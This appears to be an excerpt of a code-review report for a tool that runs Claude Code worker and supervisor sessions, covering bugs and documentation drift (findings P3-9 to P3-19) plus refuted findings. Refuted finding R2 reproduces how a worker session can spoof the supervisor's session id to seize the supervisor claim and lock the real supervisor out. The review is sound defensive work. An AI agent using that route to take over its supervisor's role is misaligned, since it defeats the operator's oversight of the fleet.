The next builder picks up the supervisor-beat slice (still queued: `docs/specs/three-tier-command.md:1058-1061` calls it v2). They read '§6.1 The generic installer already exists', go to wire `PLATFORM.autoclean_task_install(task_name="claude-fleet-supervisor-beat", …)`, and find no such method on either backend. Worse, they may re-add an OS scheduler for the beat — reintroducing exactly the missed-occurrence class (`StartWhenAvailable=False` on Windows, no catch-up at all on cron) that the 2026-07-27 operator ruling deleted, since nothing in this document tells them the ruling happened.

**Fix**

Add a superseding banner to §6.1/§6.2/§6.3/§9.1 pointing at the `docs/specs/autoclean.md` 2026-07-27 amendment: the adapter seam and `_fleet_task_is_ours` are deleted, the F2/F3/F4 ownership reasoning survives as a requirement any future scheduled task must inherit, and the supervisor beat — if built — must be re-decided against the beat-vs-timer ruling rather than assuming the seam is there.

**Verification:** none — see the review limits above.

---

### P3-9 — _warn_missing_bypass_ack crashes sup-spawn on an undecodable GOALS.md, contradicting its own docstring

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/supervisor-journal-and-postcompact`  |  **Category:** correctness
- **Location:** `bin/fleet.py:13362`

**What is wrong**

```
13357:    case-insensitive on the two words the shipped GOALS acknowledgement
13358:    carries ("Bypass acknowledgement (§10.2)"); a missing or unreadable
13358:    GOALS.md warns too -- an absent file cannot state anything."""
13359:    if mode != "bypass":
13360:        return
13361:    try:
13362:        text = goals_path().read_text(encoding="utf-8").lower()
13363:    except OSError:
13364:        text = ""
```

The docstring promises "a missing or unreadable GOALS.md warns too", but only OSError is caught. An undecodable GOALS.md raises `UnicodeDecodeError` (a `ValueError`) straight out of the function. Its two siblings that read the same file both catch `(OSError, ValueError)` and one documents exactly this hazard (`supervisor_goals_active`, :14418-14422; `read_tier_policy`, :10155). The call site is the very first statement of `_dispatch_supervisor_body` (:13497), i.e. before the gen-0 body is minted or dispatched.

**Failure scenario**

Same trigger as finding 1 — `supervisor/GOALS.md` containing any non-UTF-8 byte. `fleet sup-spawn "<campaign>"` (default mode is `SUP_SPAWN_DEFAULT_MODE = "bypass"`, :10046, so the guard is armed) raises `UnicodeDecodeError` at :13362; `main` catches it under the generic `ValueError` arm and the operator gets `fleet: 'utf-8' codec can't decode byte 0xe9 in position N: invalid continuation byte` with rc 1 and no gen-0 supervisor. `respawn supervisor` (§10.4) goes through the same `_dispatch_supervisor_body` and fails identically. Verified: `fleet._warn_missing_bypass_ack('bypass')` raises `UnicodeDecodeError` on such a GOALS.md while, in the same process, `fleet.supervisor_goals_active()` returns False and `fleet.read_tier_policy()['_source'] == 'default'` — the guarded siblings degrade, this one does not. Operator ruling 2 (2026-07-24) says this check must WARN and proceed, never refuse; on this input it neither warns nor proceeds.

**Fix**

`except (OSError, ValueError):` at :13363 — matching `supervisor_goals_active` and `read_tier_policy` — or read with `errors="replace"`. Either restores the documented degrade-to-warn behaviour that operator ruling 2 requires.

**Verification:** none — see the review limits above.

---

### P3-10 — Failed respawn deletes the old sid's ceiling file before dispatch and never restores it on rollback

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** correctness
- **Location:** `bin/fleet.py:5510`

**What is wrong**

Respawn unlinks the OLD sid's ceiling file BEFORE it dispatches:
```python
5509:    try:
5510:        ceiling_file_path(old_sid).unlink()
5511:    except OSError:
5512:        pass
5513:
5514:    journal_path = journal_file_path(name)
5515:    prompt, claim = compose_prompt(name, cwd, task_for_record, old_sid, journal_path=journal_path)
5516:    try:
5517:        result = dispatch_bg(...)
```
On dispatch failure the rollback restores the pre-respawn record verbatim — session_id back to `old_sid` — but never rewrites the ceiling file:
```python
5560:            r = data["workers"].get(name)
5561:            if r is not None and r.get("session_id") is None:
5562:                data["workers"][name] = before
5563:                save_registry(data)
```
The docstring at :5399-5405 claims the rollback is to "the exact pre-respawn snapshot". It is not — one piece of enforcement state is destroyed.

The two sibling paths get the order right: send's fork-steer writes the new ceiling at :4921 THEN unlinks the old at :4927; resume-limited writes at :5025 then unlinks at :5030. Only respawn unlinks first.

**Failure scenario**

Worker `w1` with `--token-ceiling 200000`, live session `old-sid`, `state/ceilings/old-sid` = 200000. Operator runs `fleet respawn w1`; `dispatch_bg` raises `NativeDispatchError` (daemon wedged, `claude` not on PATH, join expiry with no fast-completion sid). The registry rolls back cleanly to `old-sid` and the CLI reports `w1: native respawn failed`. But `state/ceilings/old-sid` is gone. From that point the Stop hook's `_read_ceiling` returns None for every turn of w1, so the over-ceiling allow-stop is silently disabled for the rest of that session's life — the worker will block on pending mail forever regardless of how many tokens it burns, and nothing (not `fleet doctor`, which only reports ORPHANED ceiling files at :8255-8262, never MISSING ones) surfaces it.

**Fix**

Move the `ceiling_file_path(old_sid).unlink()` to after `_write_ceiling_file(new_sid, token_ceiling)` on the success and fast-completion paths, exactly as send's fork-steer (:4921-4927) and resume-limited (:5025-5030) already do.

**Verification:** none — see the review limits above.

---

### P3-11 — _native_cumulative_tokens omits the sid-keyed outcome fallback the same file exists to handle

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** correctness
- **Location:** `bin/fleet.py:1511`

**What is wrong**

```python
1511:    for rec in read_outcomes(name):
```
`read_outcomes` (bin/fleet.py:9184) only reads the sid-keyed fallback file when a sid is passed:
```python
    paths = [outcome_path(name)]
    if sid and sid != name:
        paths.append(outcome_path(sid))
```
Every other caller that needs completeness passes one — `latest_native_outcome` at :1842 (`read_outcomes(name, sid=sid)`), :6948, :9634. `_native_cumulative_tokens` does not.

The sid-keyed file is not hypothetical: `stop_outcome._resolve_name` (bin/hooks/stop_outcome.py:145-160) falls back to `key = sid` whenever the registry has no record carrying that sid, which is exactly the pre-stamp window that `_fast_completion_sid` and the fast-completion branches at bin/fleet.py:3890-3915 and :5535-5553 exist to recover from. This repo's own `state/outcomes/` currently holds 13 sid-keyed files (e.g. `97e20f89-....jsonl`, 24 result records) alongside the name-keyed ones.

**Failure scenario**

`fleet spawn w1 --token-ceiling 50000` where the first turn finishes before `dispatch_bg`'s join loop observes it (the exact race :3890 handles). `stop_outcome` runs while the registry record still has `session_id: None`, so `_resolve_name` returns None and the record lands in `state/outcomes/<sid>.jsonl`. Spawn then recovers via `_fast_completion_sid` and stamps the sid. That first turn's tokens are now permanently invisible to `_native_cumulative_tokens("w1")`, which reads only `state/outcomes/w1.jsonl`. If the worker never gets re-stamped by a later name-keyed turn (single-turn worker, or repeated fast completions), the ceiling check reads 0 forever.

**Fix**

Pass the current sid: `read_outcomes(name, sid=...)` — but note `read_outcomes` also FILTERS to that sid when `sid is not None` (:9203-9204), which would break the lifetime-across-sids contract. The correct fix is to read both files without the sid filter, e.g. union `outcome_path(name)` with `outcome_path(s)` for the record's `session_id` plus every `retired_sids` member, matching how `_remove_worker_files` (:6641-6649) already enumerates them.

**Verification:** none — see the review limits above.

---

### P3-12 — --token-ceiling 0 or negative is accepted and bricks the worker at spawn

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** input-validation
- **Location:** `bin/fleet.py:16063`

**What is wrong**

```python
16063:    p_spawn.add_argument("--token-ceiling", type=int, default=None, dest="token_ceiling")
```
No lower bound anywhere: `cmd_spawn`'s validation block (bin/fleet.py:3843-3850) refuses `--max-budget-usd` but never inspects `token_ceiling`. `_write_ceiling_file` only skips `None`:
```python
234:    if ceiling is None:
235:        return
```
so `0` is written to disk. Both consumers then compare with `>=`:
- hook `bin/hooks/stop_mailbox.py:182`: `if current is not None and current >= ceiling:` — `anything >= 0` is always True.
- fleet `bin/fleet.py:4811`: `if used >= token_ceiling:` — `0 >= 0` is True even with an empty outcome store.

Verified by running the real hook against a temp FLEET_HOME with `state/ceilings/sid-B` = `0` and a non-empty `mailbox/sid-B.md`: exit 0, no `decision: block` emitted, `mailbox/sid-B.md` left undrained.

**Failure scenario**

Operator typos `fleet spawn w1 --dir X --task Y --token-ceiling 0` (or passes a computed value that rounds to 0, or `-1`). Spawn succeeds and prints a normal success line. The worker is then dead on arrival: every `fleet send w1 "..."` on an idle worker hits :4811 with `used=0 >= 0`, refuses, and flags the worker sticky `over_ceiling` on its very first steer; every mid-turn mail queued into `mailbox/<sid>.md` is silently abandoned because the Stop hook returns at :183 without claiming. Nothing warns, and the failure surfaces only as an inexplicable `cumulative tokens 0 reached token_ceiling 0` message.

**Fix**

Validate at the two `add_argument` sites' consumers: in `cmd_spawn` and `_cmd_respawn_native`, `raise FleetCliError("--token-ceiling must be a positive integer")` when `token_ceiling is not None and token_ceiling <= 0`.

**Verification:** none — see the review limits above.

---

### P3-13 — SPEC.md and CLAUDE.md state views 'never probe anything live' while /fleet:doctor spawns four subprocesses

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `docs-drift`  |  **Category:** doc-asserts-safety-property-code-lacks
- **Location:** `docs/SPEC.md:279`

**What is wrong**

`docs/SPEC.md:279`:
```
a view (statusline, `/fleet:*` read-only commands) never takes `fleet.lock`, never probes anything live, never writes, never quarantines … Post-pivot the "never probes a PID" clause generalizes: the snapshot path also never fetches the roster — roster fetches belong to mutating/authoritative commands only.
```
`CLAUDE.md:13` restates it unqualified and marks it "CURRENT STATE: TRUE OF SHIPPED CODE".

`/fleet:doctor` (`commands/doctor.md:6`) and `/fleet:overview` (`commands/overview.md:18`) are read-only `/fleet:*` commands per `docs/specs/terminal-surface.md:190-196`, and both inline bare `fleet doctor`, which spawns four live subprocesses: `bin/fleet.py:8397` `run([exe, "agents", "--json"], … timeout=10)` — a live daemon roster probe, the post-pivot successor the SPEC sentence explicitly reserves for 'mutating/authoritative commands only' — plus `_doctor_check_claude_version` / `_doctor_check_pin_version` (`claude --version`) and the two real hook-smoke subprocesses at `:8086` and `:8108`.

The test SPEC cites as enforcement (`tests/test_terminal_surface.py`) pins purity only for `status_snapshot` (`TestStatusSnapshotIsPure.test_never_probes`, :232) and the statusline (`test_main_spawns_no_subprocess`, :621). No test covers `fleet doctor` against the doctrine sentence, so the claim is unenforced as well as untrue.

**Failure scenario**

A contributor adds a new ambient or high-frequency surface (the specced watchtower, or a second statusline row) and reads SPEC §279 as licence to shell out to `fleet doctor` on a refresh interval, since 'the /fleet:* read-only commands honour the doctrine'. Each invocation spawns four subprocesses including a 10-second-timeout `claude agents --json`; on a machine where the daemon is wedged (`_doctor_check_daemon_wedge` exists precisely because that happens) the surface stalls for tens of seconds per refresh.

**Fix**

Qualify the sentence in `docs/SPEC.md:279` and `CLAUDE.md:13`: the no-probe clause governs the snapshot path (statusline, `status --stale-ok`, `peek`, `result`, `sup-status`, `knowledge`); `fleet doctor` is a diagnostic that deliberately probes, and is a view only with respect to the lock/write/quarantine clauses. Add a pin (analogous to `TestStatusSnapshotIsPure`) asserting the surfaces that must spawn no subprocess, so the enforcement claim is true.

**Verification:** none — see the review limits above.

---

### P3-14 — terminal-surface.md claims the statusline is "< 20 ms ... Asserted by test"; no such test exists and it measures ~1.1-1.4 s

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `hooks-statusline`  |  **Category:** doc-drift
- **Location:** `docs/specs/terminal-surface.md:182`

**What is wrong**

docs/specs/terminal-surface.md:182:
```
- Wall-clock budget: **< 20 ms**, zero subprocesses. Asserted by test.
```
No test in the tree asserts any wall-clock figure for the statusline: `grep -rn "time\.\(time\|monotonic\|perf_counter\)" tests/test_terminal_surface.py tests/test_views_doctrine.py` returns nothing, and no test file contains a `< 0.02` / 20 ms comparison. The only related tests are `test_main_spawns_no_subprocess` (tests/test_terminal_surface.py:621) and `test_chain_spawns_no_subprocess_when_unconfigured` (:1453), both of which cover the subprocess half only and both of which run with an empty `home` fixture (no `state/statusline-chain.json`), so they pass trivially in the configuration this repo actually ships.

Measured on this machine, with the repo's own installed `statusLine` command and its own `state/statusline-chain.json` (one caveman PowerShell delegate), three consecutive runs of the real installed command:
`ms=1281`, `ms=1403`, `ms=1075`
Even with no delegate at all, `import fleet` + `status_snapshot()` in-process is `import_ms=72.5 snapshot_ms=9.4`, and full process start-to-exit is ~400 ms.

**Failure scenario**

A future contributor reads line 182, believes a regression fence exists, and adds work to `status_snapshot()` or the render path (e.g. a per-worker file read). Nothing fails, because there is no timing test. The spec is also the document a reviewer cites when asked "is the statusline still on the hot-path budget?" — the answer it gives is 50x off from the shipped behaviour at `refreshInterval: 10`, and the surface that would prove otherwise does not exist.

**Fix**

Either add the test the line claims -- assert wall-clock of `render_statusline(status_snapshot())` under a synthetic N-worker registry, and separately assert `subprocess.run` is untouched when no chain file exists (that one already exists at :621) -- or rewrite line 182 to state what is actually asserted: "in-process render budget < 20 ms (untested); zero subprocesses unless a delegate is chained (asserted by `test_main_spawns_no_subprocess`); process start-to-exit is dominated by interpreter start-up and any chained delegate."

**Verification:** none — see the review limits above.

---

### P3-15 — Statusline picks the lexicographically smallest HH:MM, not the earliest reset

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `limits-time`  |  **Category:** correctness/display
- **Location:** `bin/fleet_statusline.py:222`

**What is wrong**

```
222:            resets = {_reset_clock(w["limit_reset_at"]) for w in group}
223:            clock = f"resets {sorted(resets)[0]}" if all(resets) else "reset?"
```
The ISO instants are collapsed to `HH:MM` strings *before* being sorted, so ordering is alphabetical on the hour-of-day and loses the date entirely. It also collapses the whole bucket to `reset?` if any single member has a null horizon, discarding the horizons that ARE known.

**Failure scenario**

Two workers are parked: `w1` resets at `2026-07-16T23:40:00Z`, `w2` at `2026-07-17T01:10:00Z`. `sorted({'23:40','01:10'})[0]` is `'01:10'`, so the statusline advertises `resets 01:10` — the LATER of the two — as the bucket's reset. The operator waits for a resume window that already opened 90 minutes earlier. Separately: `w1` with a known horizon plus `w3` with `limit_reset_at=None` renders `reset?`, hiding `w1`'s known horizon entirely.

**Fix**

Sort on the parsed instants (`min(w['limit_reset_at'] for w in group)` — ISO-8601 UTC strings sort correctly as strings) and format only the winner. For the mixed case, show the earliest known horizon with a marker (e.g. `resets 23:40 +1?`) rather than dropping to `reset?`.

**Verification:** none — see the review limits above.

---

### P3-16 — A failed resume aborts the sweep and suppresses the report of workers already resumed

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `limits-time`  |  **Category:** silent-failure
- **Location:** `bin/fleet.py:5175`

**What is wrong**

```
5168:        if _resume_one_limited(name, which, sleep, run=run):
5169:            resumed.append(name)
5170:        else:
5171:            skipped.append((name, "no longer limited (concurrent change)"))
5172:
5173:    for name in resumed:
5174:        print(f"{name}: resumed (limited -> working)")
```
`_resume_one_limited` -> `_resume_one_limited_native` re-raises after rolling its own worker back (`except BaseException: restore_mailbox_claim(claim); ... raise`, fleet.py:5010-5019). Nothing in the loop catches it, and every `print` is after the loop, so the exception escapes with zero output.

**Failure scenario**

Three workers a, b, c are all past their horizon. `fleet resume-limited` resumes `a` successfully (new sid minted, mailbox drained and finalized, turn launched), then `dispatch_bg` for `b` throws — the documented daemon-wedge outage class (`_doctor_check_daemon_wedge`, the 16h `--bg` outage in native-substrate.md). The operator sees only the traceback: no line says `a: resumed`. `c` is never attempted. The operator believes the sweep did nothing while `a` is in fact mid-turn with its mailbox already consumed.

**Fix**

Wrap the per-worker call in `try/except Exception as exc: skipped.append((name, f"resume failed: {exc}")); continue`, or at minimum print the accumulated `resumed`/`skipped` lines from a `finally` before re-raising, so a partial sweep is always reported.

**Verification:** none — see the review limits above.

---

### P3-17 — A short atomic append leaves an unterminated line, silently swallowing the NEXT complete record too

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `locking`  |  **Category:** atomicity / silent-failure
- **Location:** `bin/fleet.py:435`

**What is wrong**

Both backends detect a partial write and raise, but neither seals the torn record:

```python
            if not ok or written.value != len(data):
                raise OSError(f"WriteFile failed for {path}: {ctypes.WinError()}")   # :435
```
```python
            if written != len(data):
                raise OSError(
                    f"short append to {path}: {written}/{len(data)} bytes")          # :465-466
```

The already-written prefix stays on disk with no trailing `\n`. The next `_atomic_append_bytes` call appends at EOF, so its record is concatenated onto the torn prefix and the two become one line. Every reader of these JSONL files splits on lines and silently drops undecodable ones -- `read_outcomes` (:9198 `except (json.JSONDecodeError, ValueError): continue`), `_recent_nonce_rejections` (:12283), the event readers at :8093/:8404/:8473. The docstring acknowledges only half of this: *"A short write would tear a JSONL line that read_outcomes silently skips"* -- it does not note that the next, entirely healthy record is lost with it.

**Failure scenario**

The volume hosting `state/` fills while the Stop hook writes a large outcome (`result_text` up to `OUTCOME_RESULT_TEXT_MAX = 20000` chars, ~80KB UTF-8). The write is short; `stop_outcome.py` logs one line to `hook-errors.log` and exits 0. Space is freed. The worker's next turn ends and `append_outcome` writes a complete `kind="result"` record -- which lands glued to the torn tail, so `read_outcomes` returns neither. `has_fresh_outcome` therefore sees no outcome anchored after `last_dispatch_at`, and `recompute_worker_native` classifies a healthy, finished worker as `dead-suspected`; `fleet send` then refuses it (:4750) and `fleet result` reports `(no result event)` for a turn that completed normally.

**Fix**

In both backends, when the write is short, append a lone `b"\n"` (best-effort, ignoring its own failure) before raising, so the torn prefix is sealed as its own skippable line and the following record starts clean. Cheap and it converts a two-record silent loss into a one-record one. The duplicated copy in `bin/hooks/stop_outcome.py:79-81` needs the same change.

**Verification:** none — see the review limits above.

---

### P3-18 — README test badge claims 2022 passing; the suite collects 2825

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `tests-quality`  |  **Category:** stale-claim
- **Location:** `README.md:5`

**What is wrong**

`README.md:5`: `![tests](https://img.shields.io/badge/tests-2022%20passing-brightgreen)`.

Measured now, on both interpreters, identical node-id sets:

    py -3.13 -m pytest -q --collect-only  ->  2825 tests collected
    py -3.10 -m pytest -q --collect-only  ->  2825 tests collected
    comm of sorted node ids -> empty in both directions

Even the most recent supervisor log (`docs/AUTONOMOUS-2026-07-26.md:22`) records 2147/16, so the badge was already ~125 stale then and is now ~800 stale. `docs/PLAN-PROGRESS.md:160` shows the badge has been hand-maintained before ("README badge 1406->1403"), so drift here is a known recurring class with no pin.

**Failure scenario**

A collaborator (or an agent doing a doc-reconciliation pass) uses the badge as the expected suite size, runs the suite, sees 2825, and concludes the tree has 800 uncommitted/unexpected tests -- or, in the other direction, treats a run that collects only 2022 as green when ~800 tests silently stopped being collected. This repo's own history (`tests/test_resilience.py:74-77`, the 17-test silent-skip incident) is that a suite quietly shrinking is the failure mode nobody notices.

**Fix**

Either delete the hard-coded count from the badge, or add a test that reads `README.md`'s badge number and compares it to the live collected count (e.g. via `pytest --collect-only -q` in a subprocess, or `len(session.items)` captured in a `conftest` hook), so the number is re-derived rather than asserted.

**Verification:** none — see the review limits above.

---

### P3-19 — skills/fleet/SKILL.md documents `fleet init --autoclean` flags that were removed

- **Severity:** low  |  **Verdict:** UNVERIFIED  |  **Dimension:** `views-doctrine`  |  **Category:** doc-drift
- **Location:** `skills/fleet/SKILL.md:51`

**What is wrong**

SKILL.md:51 (the interface tier's command reference) ends: "Installed as a Scheduled Task via `fleet init --autoclean [--autoclean-interval-hours N]` (default every 6h); uninstall via `fleet init --autoclean-remove`." SKILL.md:86 likewise reasons from "once the autoclean scheduler is installed".

`cmd_init`'s docstring (bin/fleet.py:3739-3742) says the opposite: "THE TIMER IS RETIRED (operator ruling 2026-07-27). `--autoclean`, `--autoclean-interval-hours` and `--autoclean-remove` are gone." Verified against the shipped parser:

```
$ py -3.13 -c "...build_parser().parse_args(['init','--autoclean'])"
fleet: error: unrecognized arguments: --autoclean
SystemExit 2
```

SKILL.md:52 also lists "autoclean scheduler state" among doctor's checks; `_doctor_check_autoclean` (bin/fleet.py:8492) now reports last-run age, not scheduler state.

**Failure scenario**

An interface-tier session loads the fleet skill, reads line 51 while setting up a new machine, and runs `fleet init --autoclean --autoclean-interval-hours 6`. argparse exits 2 with `unrecognized arguments`. Worse, an agent that treats the sentence as true assumes a periodic sweep exists and skips `fleet autoclean` in its startup ritual (SKILL.md:25) -- so on a fleet with no supervisor, nothing ever sweeps daemon husks.

**Fix**

Delete the "Installed as a Scheduled Task via ..." sentence at :51 and the "once the autoclean scheduler is installed" clause at :86, replacing both with the beat-driven statement already at :25; drop "autoclean scheduler state" from :52 in favour of "autoclean last-run age".

**Verification:** none — see the review limits above.

---

## Appendix — REFUTED (23), kept as a record

A skeptic refuted each of these. Recorded so the same ground is not re-tilled, and because a refutation
can itself be wrong — if you have reason to doubt one, the refuting argument is right here.

### R1 — resume-limited fork-steer re-parks the worker it just resumed (stale carried 429)

- `bin/fleet.py:2807`  |  claimed **critical**  |  dimension `limits-time`

**Claim:** Worker `w1` is parked `limited` past its horizon. Operator runs `fleet resume-limited w1`; the fork-steer mints sid S2, drains the mailbox into the prompt, clears `limit_reset_at`, and commits `status=working`. Any recompute inside the next few seconds — `fleet status`, `fleet wait`, a supervisor watchtower beat — sees S2's roster entry as state-only, finds no fresh outcome for S2, and investigates. The scan reads S2.jsonl, whose tail is still the carried 429, and flips `w1` back to `limited` with a horizon recomputed from the OLD 429's timestamp (already in the past). Two wrong outcomes follow: (a) the resume turn really is running, but the registry permanently reports `limited` (sticky), so when it finishes and writes its outcome the worker never shows `idle` and `fleet send` refuses it; (b) the recomputed horizon is already past, so the worker reads `resume-eligible` and the very next `fleet resume-limited` sweep forks a SECOND live session on the same cwd/task while the first is still mid-turn — a double-launch, with the first session's sid no longer in the registry.

**Refuted because:**

- *(confidence: medium)* The finding misreads the resume control flow. It claims that "for the first seconds after the resume" S2's roster entry is state-only — the window _dispatch_grace_active exists for — so a recompute reaches _investigate_no_outcome and the scan hits the carried 429. But _resume_one_limited_native stamps session_id=new_sid only AFTER dispatch_bg returns (fleet.py:5023, 5044), and dispatch_bg does not return until _await_attach has positively observed status/pid on the new sid (fleet.py:9868-9870, 9630). The state-only startup transient is therefore consumed inside the resume call, before S2 is ever visible to any recompute; a recompute at t+1s finds a live busy entry and returns "working" at fleet.py:2875-2879, never reaching the scan. Second, the transcript premise is unsupported: native-substrate.md:137 documents the fork's transcript as the prior conversation "followed by the new turn", and the new turn's user record (tiny_prompt, fleet.py:9695) is substantive, so C2's newest-first stopping discipline (fleet.py:2699-2712) defeats the older 429. I verified this by running the real scanner on a synthetic forked transcript: tail=429 alone -> (True, ...), tail=429 + new user turn -> (False, None, None). The reviewer's "reproduction" hand-constructs the bare-429 tail rather than showing it is reachable; reaching it needs the daemon to have copied history but not written the new turn, while already attached AND showing a non-busy roster status — an unobserved conjunction. Third, consequence (a) is wrong for the transient case: cmd_send's in-flight guard (fleet.py:4713-4735) sees raw status "working", no fresh outcome, unexpired claim, and queues to the mailbox returning 0, neither refusing nor persisting the demotion. The one reachable variant — a concurrent `fleet status` persisting `limited` over the pre-claim while the registry still holds old_sid — self-heals, because _commit keys on session_id==old_sid (not status) and restamps working/new_sid/cleared limit fields (fleet.py:5042-5052). Confidence is medium rather than high only because I cannot fully exclude a sub-millisecond daemon write-ordering window; the mechanism as described is refuted by the code.
- *(confidence: high)* The finding's central premise -- that after `_resume_one_limited_native` restamps the new sid, the new sid's transcript tail is still the carried 429 -- is false in real operation.  (1) Real fork evidence. Using `state/fleet.json` `retired_sids` I located actual fork pairs and read the successor transcript `~/.claude/projects/C--proga-fleet-mf-threetier/221799f9-f6e5-45df-a821-c1885bc44e4e.jsonl` (fork of `670f38af...`). The layout is [carried history, original timestamps preserved] immediately followed at index 601 by dispatch_bg's own tiny_prompt record: `type:"user"`, timestamp 03:00:06.179Z, string content "Read C:/proga/claude-fleet/state/tasks/threetier-draft.md and follow it exactly". That record is substantive per `_is_substantive_transcript_record` (bin/fleet.py:2716), so `transcript_limit_scan`'s newest-first stopping discipline (bin/fleet.py:2689-2712) terminates there and returns (False, None, None) -- it never reaches the carried 429. I confirmed by running the real `transcript_limit_scan` against both layouts: carried-history-only -> (True, None, None); real fork layout with the prompt appended -> (False, None, None).  (2) Ordering guard upstream. `_resume_one_limited_native` restamps `session_id=new_sid` only inside `_commit` (bin/fleet.py:5038-5052), which runs after `dispatch_bg` returns; `dispatch_bg` returns only after `_await_attach` (bin/fleet.py:9869, 9627-9635) has observed `status`/`pid` on the roster entry (or a terminal state / vanished entry / an outcome record). Until then the record still carries `old_sid`, whose transcript legitimately ends at the 429 -- and the subsequent `_commit` overwrites any such transient park (its guard is `session_id == old_sid`, and it sets status=working and clears the limit fields).  (3) The grace-window premise is inverted for this path. A healthy resume turn is roster-live and `busy`, so `recompute_worker_native` returns at bin/fleet.py:2875-2879 (`live` + `busy` -> `working`) and never calls `_investigate_no_outcome`. The state-only entry `_dispatch_grace_active` exists for is exactly the shape `_await_attach` refuses to return on.  (4) Empirical 3/3 negative. `state/events.jsonl` contains three real `limit_resumed` events (mc-autoclean and mc-delete at 2026-07-16T19:04, md-contract-review at 2026-07-17T15:32). Every following `status_changed` for those workers is `working -> idle` (19:13:30 for both, 2026-07-18T03:28:08 for md-contract-review). There is no `limited_suspected` re-park after any resume; neither claimed consequence has ever occurred.  The scan-before-grace ordering and the missing freshness gate are real code facts, but the input state the finding requires (new sid restamped into the registry while its transcript's newest qualifying record is the carried 429) is prevented by the fork writing its own prompt record and by `_await_attach` gating the restamp behind observed attachment.

---

### R2 — §9 legacy-claim upgrade is takeable by any body via `--sid <holder sid>`, a value the lock-free view publishes

- `bin/fleet.py:12559`  |  claimed **critical**  |  dimension `supervisor-claim`

**Claim:** Measured end-to-end (scratch pytest against `bin/fleet.py`, tmp FLEET_HOME). State: `supervisor/INCARNATION` is a shipped five-key legacy claim `{incarnation_id: inc-L, session_id: <HOLDER_SID>, claimed_at, heartbeat_at, claimed_via}` with a 30s-old beat; registry holds `sup|inc-L|boot` (session_id=HOLDER_SID) and an ordinary worker `w1` (session_id=ROGUE_SID). From the w1 turn (CLAUDE_CODE_SESSION_ID=ROGUE_SID):
1. `fleet sup-heartbeat` -> correctly refused: "This is a worker turn: the registry resolves this session to worker 'w1' ... the supervisor claim is not a worker's to hold".
2. `fleet sup-status --json` -> prints `session_id: <HOLDER_SID>`.
3. `fleet sup-heartbeat --sid <HOLDER_SID>` -> rc 0, "heartbeat refreshed for inc-L", and stdout `NONCE: oEfH7UdYeoH1v7nEylFFWGgPM0cubnBCb4KmMhbWgW4`. INCARNATION now carries `nonce_seq: 1` and the rogue's nonce_hash.
4. The genuine supervisor body (CLAUDE_CODE_SESSION_ID=HOLDER_SID, never handed a nonce) is now locked out of every supervisor verb -- `sup-heartbeat` -> "continuity proof failed (expected generation 1) -- a second body of your lineage may be acting. STOP" -- and `_supervisor_gate` refuses it `kill`/`clean`/`send`/`spawn`/`respawn`, including `sup-release`. The rogue's stolen generation disarms the gate for the rogue. The real supervisor tier is dead until the heartbeat ages past SUPERVISOR_CLAIM_STALE_SECONDS (3600s), and the rogue can keep it fresh with `sup-heartbeat --nonce <stolen>` indefinitely.

**Refuted because:**

- *(confidence: high)* I reproduced the described behavior in a sandboxed FLEET_HOME (2 tests, both pass), so the reviewer's control-flow reading of bin/fleet.py:12493 -> 12561 -> 12580 is accurate: `--sid <holder>` satisfies both the §6.5 worker-turn gate and the §9 sid-equality test, and the legacy arm mints generation 1 and prints the plaintext nonce. But the finding is refuted on three independent technical grounds.  (1) The gate it claims to bypass is documented, in shipped code, as not a security control. bin/fleet.py:12340-12344 defines SPEED_BUMP_NOTE -- "(A speed-bump, not a security boundary: the identity behind it is the registry's verdict on an environment-supplied session id -- settable by anyone who can run this command, and donatable by the daemon that hosts the session.)" -- and _worker_turn_note (:12363-12386) appends it to the very refusal the finding quotes as its step 1. docs/specs/claim-nonce.md:3069-3071 restates it. The step1-refused/step3-allowed contrast is the documented property, not a discovered hole.  (2) `--sid` is not the vector, so the proposed fix is a no-op. current_caller_session() (bin/fleet.py:888-896) is `os.environ.get("CLAUDE_CODE_SESSION_ID")`. My second test ran the identical escalation with sid=None and only the env var set to the holder's sid: rc 0, "NONCE: ..." printed, nonce_seq 1. Both proposed remedies (scope --sid out of the arm; refuse when sid_override != current_caller_session()) are defeated by `CLAUDE_CODE_SESSION_ID=<holder> fleet sup-heartbeat`.  (3) No privilege boundary exists to escalate across. supervisor/INCARNATION is gitignored (.gitignore:7) and is a plain JSON file owned by the same OS user every worker runs as; any body that can invoke the CLI can overwrite the claim file directly with no gate involved.  Additionally the severity is contradicted by the project's own record and the arm is unreachable on this install: tests/test_identity_fixwave2.py:94-102 says "Nothing on either tree mints one of these today ... which is why the compound is MAJOR and not CRITICAL"; _claim_is_legacy (:11864) requires both nonce_hash and state absent, the live supervisor/INCARNATION carries nonce_hash and nonce_seq 1, and no code path can return a claim to legacy shape (sup-boot writes a nonce, sup-release writes state). Finally, tests/test_identity_fixwave2.py:290-306 deliberately keeps the typed/unresolved-sid lane open for the interface tier, newborn bodies and the handoff successor -- the gates at :12618 and :12684 were scoped, on the record, to close only the abstention door.

---

### R3 — sup-boot's fresh-claim arm never unlinks a stale HANDSHAKE, wedging all three handoff verbs

- `bin/fleet.py:11762`  |  claimed **high**  |  dimension `handoff`

